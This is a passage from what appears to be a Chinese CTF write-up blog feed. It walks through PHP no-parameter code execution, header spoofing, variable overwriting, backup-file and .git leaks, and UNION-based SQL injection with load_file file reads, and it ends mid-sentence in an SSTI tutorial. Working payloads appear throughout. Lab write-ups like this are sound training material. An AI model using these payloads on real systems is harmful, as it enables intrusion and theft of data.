class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(187) &#123;</span><br><span class="line">  [&quot;decimal_point&quot;]=&gt; string(1) &quot;.&quot;  // 第一个核心元素：值是.</span><br><span class="line">  [&quot;thousands_sep&quot;]=&gt; string(1) &quot;,&quot;</span><br><span class="line">  ...（后面全是无关的，不用看）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag在哪里呢？&lt;br&gt;array(5) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(4) &quot;.git&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(8) &quot;flag.php&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  string(9) &quot;index.php&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.指定到倒数第二个flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=next(array_reverse((scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>3.直接用var_dump是获取不到内容的，需要使用highlight_file把flag内容显示到网页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><h2 id="newstar-ctf-web-multi-headach3"><a href="#newstar-ctf-web-multi-headach3" class="headerlink" title="newstar ctf web multi-headach3"></a>newstar ctf web multi-headach3</h2><p>1.访问&#x2F;robots.txt</p><p>题目（”什么叫机器人控制了我的头？“）</p><p>提示机器人</p><p>2.抓包修改请求头</p><p>发现hidden.php，但是被禁止访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /hidden.php</span><br></pre></td></tr></table></figure><p>该请求头：</p><ol><li><p><strong>User-Agent</strong>：告诉服务器 “我是 Chrome 浏览器，不是扫描工具” → 防爬虫拦截。</p></li><li><p><strong>Referer</strong>：告诉服务器 “我是从网站首页点进来的，不是直接输网址” → 防直接访问。</p></li></ol><p><strong>直接输网址访问<code>hidden.php</code></strong>：大概率是外人瞎猜的、扫描工具找的，不是正常用户，直接拦</p><p><strong>从首页点链接进来</strong>：只有正常浏览网站的用户才会这么做，是 “自己人”，允许访问。</p><ol start="3"><li><strong>XFF</strong>：告诉服务器 “我是服务器本机管理员” → 过 IP 限制。</li></ol><p><code>XFF</code>头是告诉服务器 “我的真实 IP 是啥”。</p><p>开发者会加一个限制：<strong>只有服务器本机（IP 是 127.0.0.1）才能访问<code>hidden.php</code></strong>（相当于只有管理员在服务器跟前操作才有权限）。</p><p>总结：</p><ul><li><code>Referer</code>：装成<strong>正常用户</strong></li><li><code>X-Forwarded-For</code>：装成<strong>服务器管理员</strong></li></ul><p>改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://127.0.0.1:16113/</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>知识点：</p><p>1.备份文件：.zip  .bak  .swp</p><p>2.intval强制转换整数</p><table><thead><tr><th>字符串</th><th>转整数结果</th><th>原因</th></tr></thead><tbody><tr><td>“123abc456”</td><td>123</td><td>遇到 a（非数字）停止，忽略 456</td></tr><tr><td>“123.456”</td><td>123</td><td>遇到小数点（非数字）停止</td></tr><tr><td>“abc123”</td><td>0</td><td>开头就是非数字，直接转 0</td></tr><tr><td>“123 456”</td><td>123</td><td>遇到空格（非数字）停止</td></tr><tr><td>“123456”</td><td>123456</td><td>纯数字，完整转换</td></tr></tbody></table><p>3.数字和字符串比较：</p><p><code>$key</code>&#x3D;&#x3D;<code>$str</code></p><p>当 PHP 遇到「整数 &#x3D;&#x3D; 字符串」的比较时</p><p><strong>自动把右边的字符串<code>$str</code>转换成整数</strong>，再和左边的整数<code>$key</code>比较。</p><p>1.dirseach扫描：</p><p>[20:40:57] 200 -     0B - <a href="http://598f54e8-253a-4cde-9479-7307cd415454.node5.buuoj.cn:81/flag.php">http://598f54e8-253a-4cde-9479-7307cd415454.node5.buuoj.cn:81/flag.php</a><br>[20:40:58] 200 -   347B - <a href="http://598f54e8-253a-4cde-9479-7307cd415454.node5.buuoj.cn:81/index.php.bak">http://598f54e8-253a-4cde-9479-7307cd415454.node5.buuoj.cn:81/index.php.bak</a></p><p>2.打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);  //强制转换成整型</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.直接?key&#x3D;123</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>知识点：</p><ol><li></li></ol><table><thead><tr><th>运算符</th><th>含义</th><th>例子</th></tr></thead><tbody><tr><td><code>===</code></td><td>严格相等：<strong>值 + 类型都必须完全一致</strong>（缺一不可）</td><td><code>&#39;123&#39; === 123</code> → false（字符串 vs 整数）；<code>&#39;flag&#39; === &#39;flag&#39;</code> → true（值和类型都是字符串）</td></tr><tr><td><code>==</code></td><td>弱相等：只比较值，自动转换类型</td><td><code>&#39;123&#39; == 123</code> → true（自动转类型后值相等）</td></tr><tr><td><code>!==</code></td><td>严格不等：值或类型任意一个不一样，就成立</td><td><code>$x !== &#39;flag&#39;</code> → 只要<code>$x</code>的值不是<code>flag</code>，或类型不是字符串，就满足</td></tr></tbody></table><p>1.发现git泄露：</p><p>很正常的漂亮网页，试了xss，sql注入都没有漏洞</p><p>方法一：</p><p>所以用dirsearch扫描</p><p>[21:57:51] Scanning:<br>[21:57:53] 200 -     0B - &#x2F;flag.php<br>[21:57:59] 403 -   555B - &#x2F;.git&#x2F;</p><p>方法二：区分是否存在git泄露</p><p>在网址后加<code>/.git</code>返回 403（Forbidden，禁止访问），说明服务器上<strong>确实存在<code>.git</code>目录</strong>，但服务器配置了 “禁止直接访问该目录”；</p><p>如果不存在<code>.git</code>目录，会返回 404（Not Found，未找到）—— 这是区分 “存在但禁止访问” 和 “完全不存在” 的关键。</p><p>2.githack获取源码</p><p>index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;//肯定存在$flag,只是我们看不见</span><br><span class="line"></span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;//$a=$flag，所以我们只要把a改为handsome</span><br><span class="line">    //$handsome=$flag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;//$x为get得到的参数名，$y为参数名的值</span><br><span class="line"></span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;//flag参数的值==$x（get得到的参数名）；</span><br><span class="line">    //$x（get得到的参数名）!= flag </span><br><span class="line">    举例：a=flag&amp;&amp;flag=a</span><br><span class="line">        exit($handsome);//所以我们只要把a改为handsome，这里输出的$hs就是$flag</span><br><span class="line">    &#125;//payload：?handsome=flag&amp;flag=handsome</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get得到的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure><p>知识点：</p><ol><li><code>=&gt;</code></li></ol><p>在 PHP 的 <code>foreach</code> 循环中，它的含义是：</p><ul><li><strong><code>$x</code> (键&#x2F;Key)</strong>：这是你传参时的“名字”。</li><li><strong><code>$y</code> (值&#x2F;Value)</strong>：这是你传参时“等于号后面的内容”。</li></ul><ol start="2"><li>核心纠正：$x 到底是“名”还是“值”？</li></ol><p>在 <code>foreach($_GET as $x =&gt; $y)</code> 这一句里：</p><ul><li><strong><code>$x</code></strong> 拿的是 <strong>“等号左边的名字”</strong>（参数名）。</li><li><strong><code>$y</code></strong> 拿的是 <strong>“等号右边的内容”</strong>（参数值）。</li></ul><p>如果你传入 <code>?handsome=flag</code>：</p><ul><li><strong><code>$x</code></strong> 的值是字符串 <code>&quot;handsome&quot;</code>。</li><li><strong><code>$y</code></strong> 的值是字符串 <code>&quot;flag&quot;</code>。</li></ul><p>分析：</p><p>方法一：exit($handsome);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">要使输出的$handsome为$flag，就联想起前面的变量覆盖，只要使handsome=flag，那么就可以得到了；</span><br><span class="line">所以构造出第一个handsome=flag；</span><br><span class="line">又因为要满足 flag的值 要等于 前面$x的值(handsome)，</span><br><span class="line">所以我们构造出另一个：flag=handsome;此时也满足handsome!=&#x27;flag&#x27;</span><br><span class="line"></span><br><span class="line">payload：?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;  //注意这里是 ||</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload: ?is&#x3D;flag&amp;flag&#x3D;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$is = $flag</span><br></pre></td></tr></table></figure><p>方法三：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;//isset = is set (是否设置了/是否有值)。</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$yds=$flag</span><br></pre></td></tr></table></figure><p>payload:?yds&#x3D;flag</p><p>flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(&#x27;/flag&#x27;);   //   /flag是绝对路径</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-sql注入</title>
      <link href="/posts/7f1f5ac3.html"/>
      <url>/posts/7f1f5ac3.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-sql注入"><a href="#web-sql注入" class="headerlink" title="web-sql注入"></a>web-sql注入</h2><h2 id="08-第八章-天衍真言，星图显圣-题解"><a href="#08-第八章-天衍真言，星图显圣-题解" class="headerlink" title="08 第八章 天衍真言，星图显圣 题解"></a>08 第八章 天衍真言，星图显圣 题解</h2><p>1.判断字段数order by 2</p><p>2.判断回显位</p><p>‘union select  1,2#</p><p>Welcome 1</p><p>3.数据库名</p><p>‘union select database()#</p><p>Welcome user</p><p>4.尝试查询数据库名为user下的所有表名</p><p>‘union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;’user’#</p><p>Welcome flag,users</p><p>5.尝试查询 数据库名为user，表名为flag 下的所有列名</p><p>‘union select group_concat(column_name),2 from information_schema.columns where table_schema&#x3D;’user’ and table_name&#x3D;’flag’#</p><p>Welcome value</p><p>6.查找数据</p><p>错误答案：’union select value,2 from flag#   &#x2F;&#x2F;忘记加数据库名了</p><p>‘union select value,2 from user.flag#</p>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-ssrf</title>
      <link href="/posts/f0b16724.html"/>
      <url>/posts/f0b16724.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-ssrf"><a href="#web-ssrf" class="headerlink" title="web-ssrf"></a>web-ssrf</h2><h2 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF &#x3D; 服务器端请求伪造"></a>SSRF &#x3D; 服务器端请求伪造</h2><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol><li><strong>主体是服务器</strong>：请求是「服务器发起」的，不是你的电脑；</li><li><strong>权限是服务器的权限</strong>：服务器能访问的资源（本地文件、内网 IP），你本来访问不到，但通过 SSRF 就能间接访问；</li><li><strong>核心是 “伪造请求”</strong>：你伪造一个服务器会执行的请求（比如本地文件地址、内网地址），服务器替你执行。</li></ol><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>1.注册登陆界面，sqlmap扫描</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py <span class="literal">-u</span> <span class="string">&quot;http://3992b9c4-b99e-44db-96b6-111d3cb92681.node5.buuoj.cn:81/&quot;</span> <span class="literal">-e</span> php <span class="literal">--threads</span> <span class="number">1</span> <span class="literal">--delay</span> <span class="number">3</span> <span class="literal">-w</span> ./ctf_core.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\21709\AppData\Roaming\Typora\typora-user-images\image-20251217210112375.png![image-20251217210507607](/images/image-20251217210507607.png" alt="image-20251217210112375"></p><p><img src="/images/image-20251217204024349.png" alt="image-20251217204024349"></p><p>打开备份文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户构造恶意序列化字符串 → 后端用unserialize()解析 → 生成篡改了blog属性的UserInfo对象 → 调用getBlogContents() → 执行curl_exec() → 读取flag.php</span><br></pre></td></tr></table></figure><p>方法2：sql注入</p><p>注册，登录，发现蓝字</p><p><img src="/images/image-20251217215524707.png" alt="image-20251217215524707"></p><p>点击得到no参数</p><p><img src="/images/image-20251217215543418.png" alt="image-20251217215543418"></p><p>发现过滤</p><p><img src="/images/image-20251217210311771.png" alt="image-20251217210311771"></p><p><img src="/images/image-20251217210702831.png" alt="image-20251217210702831"></p><p>2.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=-1%20union/**/select%201,2,3,4--+</span><br></pre></td></tr></table></figure><p>为什么是-1不是1？</p><ol><li><strong>no&#x3D;-1</strong>：靶机里根本没有编号为 - 1 的记录，原 SQL 查询返回空结果；此时<code>union select</code>的结果会补位显示在页面上，注入成功。</li><li><strong>no&#x3D;1</strong>：靶机里有编号为 1 的真实记录，原 SQL 查询结果会覆盖<code>union select</code>的结果，你看不到注入效果（或因列类型不兼容直接报错），看似 “失败”。</li></ol><p>核心就一句话：<code>-1</code>让原查询无结果，注入语句的结果能显示；<code>1</code>让原查询有结果，把注入结果盖住了。</p><p>这就是为什么我前面在输入1的时候注入点一直返回admin用户名，而没有任何回显</p><p><img src="/images/image-20251217212408795.png" alt="image-20251217212408795"></p><p>得到回显位为2</p><p>2.2</p><p>view.php?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,database(),3,4–+</p><p><img src="/images/image-20251217212559085.png" alt="image-20251217212559085"></p><ol start="2"><li><p>3</p><p>?no&#x3D;-1 union&#x2F;<strong>&#x2F;select 1,user(),3,4–+　　　　&#x2F;&#x2F;数据库信息</strong>,查看权限</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhos</span><br></pre></td></tr></table></figure><p>为什么要查看权限？</p><p>① <strong>确认权限</strong>：<code>user()</code>能看当前数据库用户的权限（比如是不是 root）——root 权限能直接读 &#x2F; 写文件、查所有库，普通用户只能查当前库；</p><p>② <strong>定位目标</strong>：<code>database()</code>能知道靶机的核心数据库名（比如<code>buu_flag</code>），后续直接查这个库的表 &#x2F; 字段，就能找到 flag；</p><p>③ <strong>验证环境</strong>：比如查<code>version()</code>（数据库版本），能判断用什么注入技巧（比如 MySQL5.5 和 8.0 的注入方法有差异）。</p><p>是root权限，利用load_file()函数可以用绝对路径去加载一个文件，</p><p>load_file(file_name):file_name是一个完整的路径，</p><p>于是我们直接用var&#x2F;www&#x2F;html&#x2F;flag.php路径去访问一下这个文件</p><h3 id="一、核心原理"><a href="#一、核心原理" class="headerlink" title="一、核心原理"></a>一、核心原理</h3><p><code>load_file()</code> 是 MySQL 的文件读取函数，root 权限下能直接读取服务器上的文件；<code>/var/www/html/</code> 是 Linux 服务器中 PHP 网站的默认根目录，<code>flag.php</code> 大概率放在这里，把这个路径传给<code>load_file()</code>，就能通过 SQL 注入读取文件内容。</p><ol><li>写法：<code>union select 1,load_file(&#39;绝对路径&#39;),3,4</code>（把路径换成<code>/var/www/html/flag.php</code>）；</li><li>操作：浏览器直接访问拼接后的 URL，页面会显示<code>flag.php</code>的内容；</li><li>兜底：读不到就换路径 &#x2F; 加<code>hex()</code>转码，CTF 靶机的<code>flag.php</code>几乎都在<code>/var/www/html/</code>下，root 权限必能读到</li></ol><h3 id="二、注入语句写法"><a href="#二、注入语句写法" class="headerlink" title="二、注入语句写法"></a>二、注入语句写法</h3><p> <code>user()</code> 替换成 <code>load_file(&#39;/var/www/html/flag.php&#39;)</code> 即可，最终完整 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=-1union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 备用1：网站根目录简写</span><br><span class="line">load_file(&#x27;/var/www/flag.php&#x27;)</span><br><span class="line"># 备用2：nginx/apache默认路径</span><br><span class="line">load_file(&#x27;/usr/share/nginx/html/flag.php&#x27;)</span><br><span class="line"># 备用3：临时目录</span><br><span class="line">load_file(&#x27;/tmp/flag.php&#x27;)</span><br></pre></td></tr></table></figure><p>为什么是这个路径，报错时候有显示，请看下图：</p><p><img src="/images/image-20251217214135585.png" alt="image-20251217214135585"></p><p><img src="/images/image-20251217213911581.png" alt="image-20251217213911581"></p><p>注入之后发现并没有flag，去抓包看看</p><p><strong>view.php?no&#x3D;-1%20union&#x2F;</strong>&#x2F;select 1,group_concat,3,4–+</p>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-ssti注入</title>
      <link href="/posts/7604fc0c.html"/>
      <url>/posts/7604fc0c.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-ssti注入"><a href="#web-ssti注入" class="headerlink" title="web-ssti注入"></a>web-ssti注入</h2><h3 id="模板注入初步https-hello-ctf-com-hc-web-ssti-1"><a href="#模板注入初步https-hello-ctf-com-hc-web-ssti-1" class="headerlink" title="模板注入初步https://hello-ctf.com/hc-web/ssti/#_1"></a>模板注入初步<a href="https://hello-ctf.com/hc-web/ssti/#_1">https://hello-ctf.com/hc-web/ssti/#_1</a></h3><blockquote><h3 id="ProbiusOfficial-Hello-CTF"><a href="#ProbiusOfficial-Hello-CTF" class="headerlink" title="ProbiusOfficial&#x2F;Hello-CTF"></a><a href="https://github.com/ProbiusOfficial/Hello-CTF">ProbiusOfficial&#x2F;Hello-CTF</a></h3></blockquote><h2 id="前置知识¶"><a href="#前置知识¶" class="headerlink" title="前置知识¶"></a>前置知识<a href="https://hello-ctf.com/hc-web/ssti/#_2">¶</a></h2><p>在开始之前，我们先大概介绍一下什么是模板，什么又是模板注入。</p><h3 id="什么是模板¶"><a href="#什么是模板¶" class="headerlink" title="什么是模板¶"></a>什么是模板<a href="https://hello-ctf.com/hc-web/ssti/#_3">¶</a></h3><p><strong>模板</strong> 是一种用于生成动态内容的工具。  </p><p>它们通常包含两个基本部分：</p><p>比如下图为 Hello-CTFtime 项目中，渲染比赛列表的时候用到的模板：</p><p><strong>绿色</strong> 部分为 <strong>静态内容</strong> ，而 <strong>橙色</strong> 部分则是 <strong>动态占位符</strong> </p><p><img src="/images/image-20231128133158187.png" alt="image-20231128133158187"></p><p>大多数模板的工作流程：</p><p><strong>定义模板  -&gt;  传递数据  -&gt; 渲染模板  -&gt; 输出生成</strong></p><p><img src="/images/image-20231128135756055.png" alt="image-20231128135756055"></p><h3 id="什么是模板注入¶"><a href="#什么是模板注入¶" class="headerlink" title="什么是模板注入¶"></a>什么是模板注入<a href="https://hello-ctf.com/hc-web/ssti/#_4">¶</a></h3><p>我们之前在说SQL注入的时候，这样描述SQL注入 “<strong>通过可控输入点达到非预期执行数据库语句</strong>”，比如后台预期的语句是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = &quot;数据传递点&quot;</span><br></pre></td></tr></table></figure><p>在预期情况下，数据传递点只会是 1，2，3，4……</p><p>但是我们要是让数据传入点的值为 <code>1&quot; union select 